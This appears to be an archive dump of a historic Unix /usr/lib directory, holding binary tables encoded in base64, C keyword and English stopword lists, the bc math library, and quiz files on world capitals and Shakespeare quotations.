/wsRhr///zosjL///yIjAAD//xwjmL///y0jnr///xIjpL///yMbqr///yYtAAD//ykbAA
D//xIbvL///yobwr///xUbyL///yQczr///wkS1L///xsS2r///xwL4L///y0l5r///woS
7L///yIp8r///xIc+L///zYt/r///woSAAD//zQtCsD//yYtEMD//yIhFsD//yYtBMASGB
zA//8jGyLAOiy2v///FQuSvwImLMAMHLC///89GQAA//8GB0TA//8tHkrA//8dJFDA//84
O1bA//8NHVzA//8iGmLA//8LEWjA//86LG7A//8VC3TA//8VJAAA//8xIYDA//8KEobA//
8iK4zA//8SGJLA//89NDbANy96wCMbmMAkHDi///8tIwAA//8SI7DA//8qG7bA//8BErzA
//86JcLA//8OMQAA//8qGc7A//8TJNTA//8iJdrA//8kE+DA//86LObA//8VJOzA//89O/
LA//8FBPjA//8wKP7A//8CHQTB//8kGwrB//8UGxDB//88PhbB//8MFBzB//8jGyLB//8K
GijB//8QIQAA//85ODTB//8xODrB//8kOUDB//8OMUbB//8iJEzB//8VJFLB//8tM1jB//
8DGF7B//8qGWTB//8JGWrB//8jG3DB//8KGnbB//8eJ3zB//8PF4LB//8CCQAA//8bE47B
//8MFJTB//88PprB//8JEKDB//89EKbB//8DEazB//8jG7LB//8KGrjB//89NC7BOh6IwS
IgvsH//wgQeLsCJhq/ARKewBULyMABEMTBChIAAAkRVLsVBAAA//80LEK7NCTSwTYuGLv/
/wQG9MH//ykiAsL//woS+robIgjC//82LgAA//8EBhjC//8vJR7C//8UGyTC//8KEgAA//
8KGgAA//8vJTbC//8EBTzC//8zLELC//8UG0jC//8eL07C//8CFAAA//8eLVrC//8PF2DC
//80LGbC//8KEmzC//83J3LC//8OFXjC//8sJX7C//8EBYTC//8zLIrC//8PF1TCFBuQwv
//CREAAP//KiCgwv//AQumwv//PD6swv//AhSywv//Oym4wv//AxO+wv//PTTEwv//ChLK
wv//MSHQwv//BAbWwv//NCzcwv//FBviwv//Hi3owjszlsIeLyrCOyAwwv//DBTuwv//LR
4Aw///JB4Gw///IhsMw///FSQSw///NCIAAP//BQMew///OwMkw///GyIqw///Ixoww///
Cho2w///AQsAAP//PD5Cw///AglIw///PTROw///CRFUw///OjNaw///DBRgw///DBQAAP
//PD5sw///FSRyw///KiR4w///AiZ+w///ODqEw///GiSKw///MSGQw///CBCWw///PSKc
w///EBqiw///Ihuow///ARCuw///Ixq0w///Chq6w///FRsAAP//IhvGw///ERrMw///IR
rSw///ChrYw///OjHew///CRHkw///ARIAAP//Myrww///GhH2w///ODr8w///ChoCxP//
IBoIxP//CxoOxP//OjMUxP//AwoaxP//KiAgxP//EQsmxP//IxosxP//ChoyxP//Iik4xP
//ERsAAP//KzJExP//GiJKxP//IitQxP//CxFWxP//ODlcxP//AQtixP//OihoxP//ODoA
AP//CRF0xP//Oih6xP//AiZuxAESgMT//zs0hsT//wMKkMT//zw+lsT//woanMT//zEqos
T//xsRPsQbKqjE//89Iq7E//8VG7jE//89NDzDOylmwzozwMMxIerDIhu+xP//GyIAAP//
PD7axP//BAbgxP//Ah0AAP//PD7sxP//BAbyxP//CREAAP//PD7+xP//AQsExf//PSsKxf
//DBQQxf//OjMWxf//BAYcxf//PTTmxD0r+MQ7KSLF//8EBsTEChIoxf//BAYAAP//LSNA
xf//GiNGxf//MypMxf//GypSxf//ODpYxf//ESIAAP//Ixxkxf//CRJqxf//GRJwxf//DB
x2xf//PRl8xf//ARKCxf//AQsAAP//PSuOxf//AhSUxf//NCyaxf//ChKgxf//Hiemxf//
Dxesxf//NCyIxTMessX//xsRuMX//zg6wsX//woaXsUEBsjF//86M87F//8VG9jF//8VGw
AA//8iG+TF//8EBurF//8bCgAA//80JPbF//8VG/zF//8iGwLG//8KEgjG//87KQ7COiUA
ADoeGMM0LDbFIhvexToz8MU7IA7G//8FDhTG//8bIgAA//8CCwAA//8NFQAA//80LUTG//
85MErG//8bK1DG//8CFFbG//8cB1zG//84OWLG//8lHGjG//8qOG7G//88NHTG//8YKnrG
//8xKoDG//8OKobG//87G4zG//8VG5LG//8aIQAA//8iKZ7G//8YGqTG//80LarG//8mLb
DG//87NLbG//8AA7zG//83L8LG//8CJsjG//88Ps7G//8BEtTG//8+LdrG//8EBuDG//89
IubG//8bIuzG//8VJAAA//8+LfjG//8EBv7G//89IgTH//8bIgrH//8BCwAA//88NRbH//
8xKhzH//84OSLH//8OMSjH//8kGy7H//8LIDTH//8tJDrH//8CC0DH//81LUbH//8VJEzH
//8qIFLH//8YIFjH//8iG5jGODryxjspEMc7IF7H//8DGGTH//8jGnbH//8CIgAA//8KLo
LH//8AAojH//88Po7H//8CCZTH//8+LZrH//8NFQAA//88NKbH//8CCazH//84OrLH//8J
ELjH//8+Lb7H//82LcTH//87LcrH//8JEKDHGzbQx///PRDWx///EhwAAP//Oznmx///Ix
Lsx///PSvyx///BQP4x///LSb+x///EiMEyP//CiUKyP//GxQQyP//NCoWyP//AAIcyP//
NS0iyP//AiYoyP//PjQuyP//GykAAP//EyE6yP//GCFAyP//ECFGyP//LRtMyP//EhNSyP
//Oy1YyP//CRFeyP//ChhkyP//GxJqyP//NCpwyP//ARB2yP//PjR8yP//AAIAAP//PD6I
yP//BQOOyP//PTSUyP//ARKayP//Pi2gyP//AgmmyP//Ci6syP//ARDgxwESNMgCHYLICR
GyyP//JQq4yP//AxvKyP//KhvQyP//FRvWyP//DBQAAP//OjviyP//GBroyP//OynuyP//
BQP0yP//ODr6yP//AxgAyf//IxoGyf//ChoMyf//ARAAAP//KTsYyf//JBoeyf//PjQkyf
//Axgqyf//Ihswyf//FSQ2yf//Ixo8yf//ChpCyf//AxgAAP//OyBOyf//FBtUyf//MSpa
yf//JCpgyf//Ihtmyf//FSRsyf//PTRyyf//ARJ4yf//Pi1+yf//AhSEyf//IxqKyf//Ch
qQyf//IhvcyD4tEsk7KUjJODqWyf//KiQAAP//CRGuyf//MyK0yf//Fh+6yf//Ox/Ayf//
GB/Gyf//KTvMyf//GyLSyf//NB/Yyf//FR/eyf//PTTkyf//AQvqyf//LTPwyf//Axj2yf
//DBwAAP//KyICyv//GyIIyv//PD4Oyv//AQsUyv//PSsayv//Axggyv//Oy0myv//Ji0s
yv//Ny8yyv//AiY4yv//EhoAAP//Ny9Eyv//AQtKyv//NCJQyv//GyJWyv//Oyn8yTg6Ps
o9NFzK//8EBmLK//8+LXDK//8KGnzHBAacyQoSdsr//yUdAAD//wkSisr//wAFkMr//ykJ
lsr//wYHnMr//zsposr//wUlqMr//zEqrsr//yQqtMr//zw+usr//xUkwMr//ywlxsr//w
kSzMr//xsS0sr//xwl2Mr//yIb3sr//xQc5Mr//z006sr//wMY8Mr//zQs9sr//w0U/Mr/
/yMUAsv//wESCMv//y0jDsv//wIUFMv//yMaGsv//zcnAAD//wMbJsv//ykyLMv//xIYMs
v//yo0OMv//wESPsv//yIpRMv//xsRSsv//z0iUMv//xUbVsv//yUeXMv//xceYsv//yQb
aMv//w8Xbsv//ywkdMv//xQbesv//y0egMv//wIUhsv//xUfAAD//zstksv//yYtmMv//z
0insv//xoRAAD//yokqsv//xgasMv//z0itsv//xUmvMv//yUzwsv//wUDyMv//yQczsv/
/wMY1Mv//yMa2sv//wImpMsKGuDL//80LIzLNCTmy///Chogyxsi8Mv//wESAAD//yUKBM
z//wMbCsz//yobEMz//xUbFsz//zg6+ssiGxzM//8EBiLM//80LHzKPi0szCUcOMY7ID7G
//8FDjLM//8FDAAA//84OUrM//8MFFDM//8qI1bM//8bI1zM//87I2LM//8aI2jM//80LG
7M//8DG3TM//8xKnrM//8kKoDM//8iG4bM//8KGozM//8eJ5LM//8VJJjM//8CCwAA//8F
DgAA//8bIgAA//8iG965Oymouj4tMsY6JUTMOh6ezDsgpMw1LarMNiawzP//Cxu2zP//CR
EAAP//MCDezP//AAHkzP//PD7qzP//AQvwzP//PjT2zP//BAb8zP//NCwCzf//ChoIzf//
MSoOzf//BQQAAP//PD4azf//DBwgzf//PjQmzf//BAYszf//IhMAAP//MSk4zf//GCI+zf
//LCREzf//EhhKzf//IxtQzf//DBxWzf//LTxczf//BQRizf//PD5ozf//BAZuzf//NCx0
zf//ARJ6zf//NCwyzT4tgM3//xsqFM0bEYbN//8jKgAA//8+NJrN//8OI6DN//8sI6bN//
8YA6zN//8oIbLN//8bI7jN//86LL7N//8SG8TN//85KsrN//8DGNDN//8wKNbN//8KEtzN
//8jG+LN//8bIejN//8hMgAA//86LPTN//8CFPrN//89OwDO//8DOwbO//8eLQzO//8PFx
LO//85KhjO//8bIR7O//8tHiTO//8BECrO//8jGjDO//8KGjbO//88PjzO//8EBkLO//85
KpDNNCTuzT4tSM7//xUbTs7//xULAAD//zsgYs7//xsiaM7//wUDAAD//zAodM7//wMCes
7//zg6gM7//wgYhs7//zoxjM7//xQbks7//zEpmM7//wIUns7//ygipM7//wESqs7//zko
sM7//xsits7//zw+vM7//wUEAAD//zooyM7//xIYzs7//zEq1M7//yQq2s7//y0z4M7//w
ES5s7//zQs7M7//xUk8s7//zkq+M7//xIb/s7//wUDAAD//y0zCs///xgzEM///zwzFs//
/yQzHM///zs8Is///wMYKM///zoxLs///xUkNM///zEpOs///wIdQM///yIbBM85M0bP//
8EBkzP//88PlbP//8EBsLOChJcz///Ihtczj4tYs85Km7O//8LG2zP//89NnrP//8FDoDP
//87GwAA//8SG4zP//8kHJLP//8RC5jP//8gGJ7P//8KEqTP//8wIKrP//8SAbDP//8jG7
bP//8BErzP//8tJcLP//8EBsjP//86LM7P//8FDtTP//85KtrP//8bEeDP//80JObP//8V
G+zP//8iG/LP//8LG/jP//8KGgAA//85KtjMNi6GzzUt/s87MgTQ//9CZW5vbmkAAEJlbm
tvIEdhbWJpdAAAQmVua28gR2FtYml0AAAMFAAA//82JkDQ//8LHEbQ//89NUzQ//8BC1LQ
//86LFjQ//8EBl7Q//8+NGTQ//8FDmrQ//8FAQAA//8nH3bQ//8DGHzQ//83J4LQ//8BEI
jQ//82Jo7Q//8EBpTQ//80JZrQ//8FDqDQ//8QIQAA//8/PKzQ//8DEbLQ//8+LbjQ//8B
EL7Q//8MFAAA//81LcrQ//8QCtDQ//8xKdbQ//8BENzQ//84OeLQ//8DEejQ//8FAQAA//
84OfTQ//8DEfrQ//87MgDR//8BCwbR//81JcTQPjTu0D4tDNH//wQGEtH//z02INH//wUO
JtH//wkQAAD//zg6MtH//wUBONH//zw0PtH//xUmRNH//zolStH//xEJUNH//w0VAAD//z
EqXNH//w4qYtH//yUeaNH//xEYbtH//zg6dNH//xUmetH//xoiAAD//zg6htH//w4VjNH/
/x4VktH//w8XmNH//xAJAAD//zQcpNH//xMcqtH//y0csNH//wscttH//yQcvNH//xEQwt
H//zolgNE6Hp7RNy/I0f//BQHO0f//OzJW0Tw03NH//wMR4tH//z887NH//wEL8tH//z02
+NH//wQG/tH//zYuBNL//wUOCtL//w8fAAD//wQTAAD//xwTHNL//xUEItL//yQcKNL//w
0ULtL//xsUNNL//wwUOtL//zcnFtI3L0DS//8EBkbS//8PHwAA//8VGwAA//8NHQAA//8S
IQAA//8qG2LSJBto0v//FRtu0v//Oh5c0jQqeNL//wESftL//yobiNL//xQbjtL//z02lN
L//wwUmtL//zcnVtI+NKDS//8EBqbS//89NlDSNS2w0v//BQ620v//NS1w0D40ptA2LizR
Pi0Q0jYmwNL//w4WxtL//zw93NL//xA94tL//zsgAAA9NAAA//8EBu7S//80JPjS//8FDv
7S//8tMwTT//8OFgrT//80JOjSPi0Q0///CxMW0///MtA5KiDT//8CECnT//8EBgAA//86
MzTT//8BCzrT//87IEDT//8FDkbT//84OUzT//8LE1LT//80JFjT//8OFl7T//85KmTT//
8DEWrT//8+NAAA//8BEHbT//89EHzT//8CEILT//8EBgAA//8ZEIjTOh6O0///BQ6U0///
OSqe0///CxOk0///NCSq0///Dhaw0///GRAu0xkRcNM1LbbT//8IELzT//8DEQAA//8qGd
DT//8ZIdbT//85KtzT//8JAOLT//84AOjT//8QGe7T//8gGfTT//8IEPrT//8EBgAA//80
JAbU//8ZIgzU//89PBLU//8LExjU//88Ph7U//8FDiTU//89NirU//8OFjDU//8DCgAA//
87KTzU//8ZIULU//8DEQAA//8cEk7U//8MFFTU//8tHFrU//8LG2DU//87IGbU//8bCWzU
//85KnLU//8JG3jU//8LGwAA//8iGYTU//8NFIrU//8bFJDU//8MFJbU//8ZIgAA//80JK
LU//8LE6jU//8wIADUNi421DkqSNQiGX7UNCyc1DkzrtT//wIJtNT//wQGAAD//zMi1NT/
/wUO2tT//zQq4NT//w4W5tT//z407NT//xki8tT//zQk+NT//wsT/tT//w4WAAD//z02Ct
X//wsTENX//zYuFtX//wwcHNX//ygyItX//xkhKNX//xkhAAD//wUOAAD//zoxOtX//w4W
QNX//zkqRtX//wsTTNX//ykiUtX//xkiWNX//w4eAAD//xkiAAD//zkzatX//wMYcNX//x
4nZNUeJXbV//8VJHzV//8LEwAA//80JIzV//8ZIpLV//8EBgAA//8+NJ7V//8FDqTV//85
KqrV//8OFrDV//89IrbV//8LE7zV//80JMLV//8ZIsjV//8k0CIZytM+Lc7UOTME1TkoLt
UwIDTVMSle1ToehtU7MpjVNS3O1f//CRnX1f//HNAjG/zV//8OFgrQChoF1v//MiIK1v//
AhQAAP//MiQa1v//BQMg1v//ODsm1v//Dxcs1v//OiUy1v//AwI41v//AwwAAP//IBlE1v
//GhFK1v//OzI+1jsgUNb//wQGVtb//zw+YNb//wwWZtb//z02bNb//wYMctb//zYueNb/
/wUaftb//zMthNb//yYtitb//zcvkNb//wgYltb//zAonNb//wImotb//wQCAAD//yMrAA
D//zMptNb//wgYutb//zMprtYwKMDW//8DC8bW//88PtDW//8MFtbW//85M9zW//8GDOLW
//89NujW//8CJu7W//8jKQAA//88O/rW//8SIwDX//87IwbX//8DIwzX//8tIxLX//8aIx
jX//8sIx7X//8FGiTX//80LCrX//8IGDDX//85M6jWNi701jAoNtf//wESPNf//w4cAAD/
/zw+UNf//wUOVtf//z0rXNf//wMMYtf//zstaNf//xwtbtf//z4tdNf//xIcetf//yUdgN
f//w4ehtf//zUljNf//wESktf//z4tStc0JJjX//8bI57X//8jHKjX//8MHK7X//8EBgAA
//88PrrX//8FDsDX//89NsbX//8MEszX//8zLdLX//8GDNjX//85M97X//8OFuTX//8MEg
AA//8zLfDX//8GDPbX//85M/zX//8CHQLY//81JQjY//8aIw7Y//87IxTY//8DIxrY//8s
IyDY//8FGibY//82LurXNCws2P//GyMy2P//Ixw82P//EhxC2P//LRxI2P//DBxO2P//Ch
IAAP//HC1a2P//DRVg2P//OShm2P//EiFs2P//LRxy2P//DBx42P//AxgAAP//IhuE2P//
ChKK2P//OSiQ2P//EiGW2P//MiKc2P//DBSi2P//MiJ+2DQsqNj//wIdrtj//xsfAAD//z
sgvtj//wQCxNj//zw+ytj//wMb0Nj//yIb1tj//wIm3Nj//woSAAD//y0b6Nj//xIj7tj/
/zYt9Nj//yYt+tj//w8fAAD//zUlBtn//woSDNn//yMcEtn//xIcGNn//y0cHtn//wwcJN
n//zIiANkyKirZ//8CJjDZ//8yIuLYPD462f//BQ5A2f//PTZK2f//DhZQ2f//BAYAAP//
PD5c2f//Bgxi2f//PTRo2f//BQ5u2f//OSp02f//DBR62f//MiKA2f//DhaG2f//AwoAAP
//NwqS2f//HyaY2f//Lyae2f//Hiak2f//Ljeq2f//Fx2w2f//NCy22f//Bhe82f//Ny/C
2f//Dx/I2f//Jy7O2f//Dh7U2f//Hifa2f//DRXg2f//MiJU2DoluNg2LlbZNCyM2Toe5t
n//wES7Nn//xsiAAD//zkoCNr//xIhDtr//xwuFNr//w0VGtr//wkZAAD//zEpJtr//zky
LNr//xsSMtr//woSONr//zsgPtr//x05RNr//yMcStr//xIcUNr//z4tINoiG1ba//8BEl
za//8lHGba//8MHGza//8yInLa//8CHXja//8yIrTXPi0C2jolftr//wYVFNYLG4Ta//8J
EgAA//8xKpza//8hKqLa//8jEqja//8FIa7a//8tI7Ta//8cI7ra//8AAwAA//8qMsba//
8TG8za//8zK9La//8DC9ja//8xKd7a//8IGOTa//8yKura//8hKvDa//8wKPba//8CFPza
//8tPALb//8LEwjb//88Pg7b//8FBBTb//89NBrb//8EBiDb//87Mibb//8FISzb//8FDA
AA//88Pjjb//8bET7b//89NkTb//8VG0rb//8iG1Db//8LG1bb//8EBgAA//88PmLb//8C
Jmjb//89NG7b//8LE3Tb//8EBgAA//8xKoDb//8hKobb//86LIzb//8DDJLb//8iGpjb//
8kFZ7b//8cHaTb//8NHarb//87I7Db//8VJLbb//8jHLzb//8aIcLb//8zI8jb//8SHM7b
//8rIwAA//8mHdrb//8kHeDb//8NHebb//8qG+zb//8VH/Lb//8+P/jb//8aEf7b//8eLA
Tc//8PFwrc//86HhDc//8EBhbc//8zKxzc//8CJiLc//88Pijc//8LEy7c//8zK3rbLRzU
2z00NNz//wUaOtz//zg5AAD//xUMTtz//y0zVNz//xwjWtz//yojYNz//xIjZtz//zsybN
z//wwVctz//zMqeNz//xsqftz//zEhhNz//wADitz//zozkNz//wMLltz//zAonNz//wQG
otz//zw+qNz//wUMrtz//z02tNz//wIUutz//zYuwNz//xUbxtz//yIbzNz//wsb0tz//z
MjwNo0LDLbNi5c2zQkSNwzK9jc//8GFd7c//8LGwAA//85KvTcMyP63P//ARIA3f//Pi0K
3f//DBwQ3f//DBzYU///CxsAAP//DBwA3f//NCQc3TMjIt0yIijd//8BEi7d//8MFQAA//
89PELd//8EBkjd//80LU7d//8cLVTd//88Plrd//8mHGDd//89Nmbd//8DDGzd//8eDHLd
//8FDHjd//86Hn7d//8VJoTd//8jHIrd//8MHJDd//82Lpbd//8CCZzd//8+LaLd//8JEa
jd//8zI67d//8GFbTd//8SIQAA//8tJMDd//8FHcbd//8kG8zd//8LG9Ld//8mHdjd//8V
Hd7d//82JuTd//8HBerd//8+NPDd//8BEvbd//8fLfzd//8OFgLe//87Hwje//8GDA7e//
89IhTe//8FGhre//80JCDe//8NFSbe//86MSze//8MHDLe//8dKwAA//8iKz7e//8CHUTe
//8xOkre//8DDFDe//8zI1be//8MFlze//8+NGLe//8hE2je//87LW7e//8cJXTe//8kG3
re//8LG4De//81JYbe//8GDIze//89IpLe//8FIZje//8CFAAA//8+NqTe//8vNqre//85
M7De//8EBrbe//8tJ7ze//8FDsLe//88Psje//8UL87e//89NtTe//8DAtre//82LuDe//
8OFube//8sJOze//8GF/Le//8zK/je//8bI/7e//8yIgTf//8KGgrf//8+LRDf//8CFBbf
//80LBzf//8LGyLf//80JJ7eMCgAACEZKN///w0VLt///zoxPN///wwcQt///wMjAAD//z
osTt///wUMVN///z40Wt///xskYN///yokZt///xUkbN///yQcct///wsSeN///xkSft//
/wILhN///z0Zit///wESkN///ywklt///wYVnN///zsjot8sIwAA//8cI6jf//8zI7Lf//
8LG7jf//85Kr7f//8MHMTf//8PHwAA//8tHtDf//8EAtbf//8+Ldzf//8DDOLf//87M+jf
//8FE+7f//86JfTf//8cJfrf//81JQDg//8OFgbg//8wKAzg//8BEhLg//8zKxjg//8CFB
7g//80LiTg//8MHCrg//8qNDDg//8bIzbg//80JDzgMyMAAP//CxtC4P//CxsAAP//IRsA
AP//KyJY4P//ECFe4P//Ihtk4P//ARBq4P//MiJw4P//BAZ24P//OTN84P//ITOC4P//Oj
OI4P//BSGO4P//PTaU4P//BhWa4P//Oyug4P//JCum4P//Myus4P//Cxuy4P//LSO44P//
HCS+4P//Pi3E4P//DBzK4P//PjQAAP//CxHW4P//NCTc4P//AQvi4P//MyPo4P//JhTu4P
//Gxz04P//DBz64P//OSoA4f//BhUG4f//IhsM4f//ChIS4f//MiIY4f//AiYe4f//PTYk
4f//Cxsq4f//NCRSsTMjktoyIhbdPi083TIqut0xKTjeMSFI3zQsyt85KkzgMChS4DYu0O
A2JjDh//8=
-- /usr/lib/cign mode=0100664 uid=3 gid=3 atime=169848908 mtime=169259120 --
auto
break
case
char	4
continue
default
do
double	4
else
extern	2
float	4
for
goto
if
int	4
long
register
return
static
struct	3
switch
while
-- /usr/lib/ctab mode=0100664 uid=3 gid=3 atime=174920717 mtime=174920717 base64=1 --
AAAAAAAAAAAAAAAAAAAAAAAADAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAHAAAAAAAAAAAABwAAAAAABwAAAAAAAAAAAAAACgAKAAoACgAK
AAoACgAKAAoACgAAAA0AAAAAAAAAAAAAAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQ
ABAAEAAQABAAEAAQABAAEAAQABAAEAAQAAAAcAAAAAAAEAAAABAAEAAQABAAEAAQABAAEA
AQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEACAAAAAkAAAAAAAIAAgACAA
IAAgACAAIAAgACAAIAAwACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC
AAIAAgACAAIABwACAAIAAgACAAcAAgACAAIAAgACAAIAAgACAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAgANAAIAAgACAAIAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAgAHAAIAAgAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAgAJAAIAAgALAAsACwALAAsACwAL
AAsACwALAAMACwALAAsACwALAAsACwALAAsACwALAAsACwALAAsACwALAAsACwALAAsACw
ALAAsACwALAAsACwALAAsACwALAAsACwALAAAACwAAAAAAAAAAAAAAAAAAAAAAAAAAAAsA
CwALAAsACwALAAsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAsACwALAAsACwALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAsACQALAAsA
-- /usr/lib/eign mode=0100664 uid=3 gid=3 atime=169848910 mtime=169259120 --
the
of
and
to
a
in
that
is
was
he
for
it
with
as
his
on
be
at
by
i
this
had
not
are
but
from
or
have
an
they
which
one
you
were
her
all
she
there
would
their
we
him
been
has
when
who
will
more
no
if
out
so
said
what
up
its
about
into
than
them
can
only
other
new
some
could
time
these
two
may
then
do
first
any
my
now
such
like
our
over
man
me
even
most
made
after
also
did
many
before
must
through
back
years
where
much
your
way
well
down
should
because
each
just
those
people
mr
how
too
little
state
good
very
make
world
still
own
see
men
work
long
get
here
between
both
life
being
under
never
day
same
another
know
while
last
might
us
great
old
year
off
come
since
against
go
came
right
used
take
three
-- /usr/lib/etab mode=0100664 uid=3 gid=3 atime=174920718 mtime=174920718 base64=1 --
AAAAAAAABgAAAAAAAAAAAAAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQ
ABAAEAAQABAAEAAQABAAEAAQABAAEAAQAAAAAAAAAAAAAAAAABAAEAAQABAAEAAQABAAEA
AQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAAAAAAAAAAAAAAIAAgACAA
IAAgACAAIAAgACAAIAAwACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC
AAIAAgACAAIAAgACAAIAAgACAAAAAgACAAIAAgACAAUAAgACAAIAAgACAAIAAgACAAIAAg
ACAAIAAgACAAIAAgACAAIAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAgACAAIAAgACAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAgACAAIAAgAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAA
EAAQABAAEAAQABAAAAAAAAAAAAAAAAAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQAB
AAEAAQABAAEAAQABAAEAAQABAAEAAQAAAAAAAAAAAAAA
-- /usr/lib/lib.b mode=0100664 uid=3 gid=3 atime=170481085 mtime=169848579 --
scale = 20
define e(x){
	auto a, b, c, d, e, g
	a=1
	b=10
	c=b
	d=1
	e=1
	for(a=1;1==1;a++){
		b=b*x
		c=c*a+b
		d=d*a
		g = c/d
		if(g == e) return(g/10)
		e=g
	}
}
scale = 20
define s(x){
	auto a, b, c, d, e, g, y
	y = -x*x
	a=1
	b=x
	c=b
	d=1
	e=1
	for(a=3;1==1;a=a+2){
		b=b*y
		c=c*a*(a-1) + b
		d=d*a*(a-1)
		g=c/d
		if(g==e) return(g)
		e=g
	}
}
scale = 20
define c(x){
	auto a, b, c, d, e, g, y
	y = -x*x
	a=1
	b=1
	c=b
	d=1
	e=1
	for(a=2;1==1;a=a+2){
		b=b*y
		c=c*a*(a-1) + b
		d=d*a*(a-1)
		g=c/d
		if(g==e) return(g)
		e=g
	}
}
scale = 20
define l(x){
	auto a, b, c, d, e, f, g, u, s, t
	if(x <=0) return(1-10^scale)
	t = scale
	scale = 0
	f = 1
	s = x
	while(s > 0){
		s = s/10
		f = f + 1
	}
	scale = t + f
	f=1
	while(x > 2){
		x = sqrt(x)
		f=f*2
	}
	while(x < .5){
		x = sqrt(x)
		f=f*2
	}
	u = (x-1)/(x+1)
	s = u*u
	b = 2*f
	c = b
	d = 1
	e = 1
	for(a=3;1==1;a=a+2){
		b=b*s
		c=c*a+d*b
		d=d*a
		g=c/d
		if(g==e){
			scale = t
			return(u*c/d)
		}
		e=g
	}
}
scale = 20
define a(x){
	auto a, b, c, d, e, f, g, s, t
	if(x==0) return(0)
	t = scale
	f=1
	while(x > .5){
		scale = scale + 1
		x= -(1-sqrt(1.+x*x))/x
		f=f*2
	}
	while(x < -.5){
		scale = scale + 1
		x = -(1-sqrt(1.+x*x))/x
		f=f*2
	}
	s = -x*x
	b = f
	c = f
	d = 1
	e = 1
	for(a=3;1==1;a=a+2){
		b=b*s
		c=c*a+d*b
		d=d*a
		g=c/d
		if(g==e){
			scale = t
			return(x*c/d)
		}
		e=g
	}
}
scale = 20
define j(n,x){
auto a,b,c,d,e,g,i,s
s= -x*x/4
if(n<0){
	n= -n
	x= -x
	}
a=1
c=1
for(i=1;i<=n;i++){
	a=a*x
	c = c*2*i
	}
b=a
d=1
e=1
for(i=1;1;i++){
	a=a*s
	b=b*i*(n+i) + a
	c=c*i*(n+i)
	g=b/c
	if(g==e){
		return(g)
		}
	e=g
	}
}
-- /usr/lib/quiz mode=0140775 uid=3 gid=3 atime=174843151 mtime=169259740 --
-- /usr/lib/quiz/africa mode=0100664 uid=3 gid=3 atime=169848915 mtime=169259236 --
Algeria:Alg[iers|er]
Botswana:Gaberones
Burundi:Bujumbura
Cameroun:Yaound['e|e'|e]
Central Africa[n Rep[ublic|]|]:Bangui
Chad:Ndjamena
Congo:Brazzaville
Dahomey:Porto Novo
Ethiopia:Addis Ababa
Gabon:Libreville
Ghana:Accra
Guinea-Bissau:Bissau
Guinea:Conakry
Ivory Coast:Abidjan
Kenya:Nairobi
Lesotho:Maseru
Liberia:Monrovia
Libya:Al Bayda['|]
Malagasy[ Rep[ublic|]|]|Madagascar:Tananarive
Malawi:Zomba
Mali:Bamako
Mauritania:Nouakchott
Morocco:Rabat
Mo[z|,c|c,|c]ambique:Louren[,c|c,|c]o Marques
Niger:Niamey
Nigeria:Lagos
Rhodesia:Salisbury
Rwanda:Kigali
Senegal:Dakar
Sierra Leone:Freetown
Somali[ Rep[ublic|]|]:Mogadis[cio|hu]
Sudan:Khartoum
Swaziland:Mbabane
Tanzania:Dar es Salaam
Togo:Lom['e|e'|e]
Tunisia:Tunis
Uganda:Kampala
United Arab Rep[ublic|]|Egypt:Cairo
Upper Volta:Ouagadougou
Zambia:Lusaka
Za["i|i"|i]re:Kinshasha
[Rep[ublic|] of |]South Africa:Pretoria
[The |]Gambia:Bathurst
-- /usr/lib/quiz/america mode=0100664 uid=3 gid=3 atime=169848917 mtime=169259236 --
Argentina:Buenos Aires
Bahamas:Nassau
Barbados:Bridgetown
Bolivia:La Paz
Bra[z|s]il:Brasilia
Canada:Ottawa
Chile:Santiago
Colombia:Bogot['a|a'|a]
Costa Rica:San Jose
Cuba:Ha[v|b]ana
Dominican Republic:Santo Domingo
Ecuador:Quito
El Salvador:San Salvador
Guatemala:Guatemala
Guyana:Georgetown
Haiti:Port au Prince
Honduras:Tegucigalpa
Jamaica:Kingston
Mexico:Mexico
Nicaragua:Managua
Panama:Panama
Paraguay:Asunci['o|o'|o]n
Peru:Lima
Trinidad[ and Tobago|]:Port of Spain
United States|US{A}:Washington
Uruguay:Montevideo
Venezuela:Caracas
-- /usr/lib/quiz/bard mode=0110664 uid=3 gid=3 atime=169848920 mtime=169259236 --
The quality of mercy is not strain['|e]d:\
It droppeth as the gentle rain from heaven:\
{The }Merchant of Venice{ IV-i}:\
Portia
Friends{,} Romans{,} Countrymen:\
lend me your ears{;}:\
Julius Caesar{ III-ii}:\
{Mark }Antony
